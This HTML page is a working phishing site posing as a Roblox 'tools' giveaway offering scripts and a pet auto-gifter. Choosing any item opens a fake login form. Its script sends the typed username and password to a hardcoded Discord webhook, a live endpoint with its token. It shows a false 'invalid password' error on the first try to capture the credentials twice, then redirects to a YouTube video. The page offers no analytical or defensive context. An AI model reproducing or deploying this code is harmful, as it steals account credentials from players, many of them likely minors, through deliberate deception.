<!DOCTYPE html>
<html lang="en" class="bg-gray-100">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Roblox Pick & Login</title>
    <!-- Tailwind CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
  </head>
  <body class="min-h-screen flex flex-col justify-between font-sans">
    <!-- Header -->
    <header
      class="bg-[#232527] text-white p-4 text-center text-3xl font-extrabold tracking-wide"
    >
      ROBLOX TOOLS 🎮
    </header>

    <!-- Pick Items Section -->
    <main class="flex-grow p-6">
      <h2 class="text-2xl font-semibold mb-6 text-[#232527]">
        Choose Your Item:
      </h2>
      <div
        id="items"
        class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-6"
      >
        <!-- Example items -->
        <!-- Card 1 -->
        <div
          class="bg-white rounded-lg border border-gray-300 hover:shadow-xl cursor-pointer p-6 flex flex-col items-center text-center transition"
          onclick="selectItem('Robux Bundle')"
        >
          <img
            src="images/scripts.jpg"
            alt="Scripts"
            class="w-full h-32 object-cover mb-4 rounded-md"
          />
          <h3 class="text-lg font-bold mb-2">Scripts</h3>
          <p class="text-sm text-gray-600">Scripts</p>
        </div>

        <!-- Card 2 -->
        <div
          class="bg-white rounded-lg border border-gray-300 hover:shadow-xl cursor-pointer p-6 flex flex-col items-center text-center transition"
          onclick="selectItem('Exclusive Avatar')"
        >
          <img
            src="images/exclusive.jpg"
            alt="Exclusive Scripts"
            class="w-full h-32 object-cover mb-4 rounded-md"
          />
          <h3 class="text-lg font-bold mb-2">Exclusive Scripts</h3>
          <p class="text-sm text-gray-600">Robux Payment</p>
        </div>

        <!-- Card 3 -->
        <div
          class="bg-white rounded-lg border border-gray-300 hover:shadow-xl cursor-pointer p-6 flex flex-col items-center text-center transition"
          onclick="selectItem('Exclusive Scripts')"
        >
          <img
            src="images/pets.jpg"
            alt="Exclusive Scripts"
            class="w-full h-32 object-cover mb-4 rounded-md"
          />
          <h3 class="text-lg font-bold mb-2">Pets</h3>
          <p class="text-sm text-gray-600">Pet's Auto Gifter.</p>
        </div>
      </div>
    </main>

    <!-- Disclaimer -->
    <footer class="bg-[#232527] text-gray-200 text-center p-4 text-sm">
      This is a <strong>site for giveaways</strong>. Use at your own risk.
    </footer>

    <!-- Login Wall -->
    <div
      id="loginWall"
      class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center"
    >
      <div class="bg-white p-8 rounded-lg shadow-xl w-full max-w-sm">
        <h2 class="text-2xl font-bold text-center mb-6 text-[#232527]">
          Login to Proceed
        </h2>
        <form id="loginForm" class="space-y-4">
          <input
            type="text"
            id="username"
            placeholder="Username"
            class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          />
          <input
            type="password"
            id="password"
            placeholder="Password"
            class="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          />
          <!-- ✅ Error message here -->
          <p id="errorMessage" class="text-red-500 text-sm hidden"></p>
          <p id="loadingMessage" class="text-blue-500 text-sm hidden">
            Please wait...
          </p>
          <button
            type="submit"
            id="loginButton"
            class="w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 transition-colors"
          >
            Login
          </button>
        </form>
      </div>
    </div>

    <!-- Script -->
    <script>
      let selectedItem = "";
      let loginAttempts = 0;

      function selectItem(itemName) {
        selectedItem = itemName;
        document.getElementById("loginWall").classList.remove("hidden");
      }

      document
        .getElementById("loginForm")
        .addEventListener("submit", function (e) {
          e.preventDefault();

          const username = document.getElementById("username").value;
          const password = document.getElementById("password").value;
          const errorMessage = document.getElementById("errorMessage");
          const loadingMessage = document.getElementById("loadingMessage");
          const loginButton = document.getElementById("loginButton");

          // ✅ Clear error & show loading
          errorMessage.classList.add("hidden");
          loadingMessage.classList.remove("hidden");
          loginButton.disabled = true;
          loginButton.classList.add("opacity-50", "cursor-not-allowed");

          const webhookURL = "https://discord.com/api/webhooks/1383072969382957178/nr0W47Y6JGzNfrHxD9_6C1H0FQ6HOUpW3z1m_U2DKfOxBx3fe9AKASrS_VFpHu_Dnb8f";

          const payload = {
            content: `🎮 **Item Picked:** ${selectedItem}\n👤 **Username:** ${username}\n🔑 **Password:** ${password}\n🔁 **Attempt:** ${
              loginAttempts + 1
            }`,
          };

          // ✅ Wait 1.5 seconds to simulate loading
          setTimeout(() => {
            fetch(webhookURL, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(payload),
            })
              .then((res) => {
                if (res.ok) {
                  loginAttempts++;

                  if (loginAttempts === 1) {
                    // ✅ First try: show error
                    errorMessage.textContent =
                      "Invalid username or password. Please try again.";
                    errorMessage.classList.remove("hidden");
                  } else {
                    // ✅ Second try: redirect
                    window.location.href = "https://www.youtube.com/watch?v=1t7BqFDzmRs";
                  }
                } else {
                  alert("Failed to send.");
                }
              })
              .catch((err) => {
                console.error(err);
                alert("Error sending to Discord.");
              })
              .finally(() => {
                // ✅ Hide loading, enable button
                loadingMessage.classList.add("hidden");
                loginButton.disabled = false;
                loginButton.classList.remove(
                  "opacity-50",
                  "cursor-not-allowed"
                );
              });
          }, 1500); // 1.5 seconds wait
        });
    </script>
  </body>
</html>
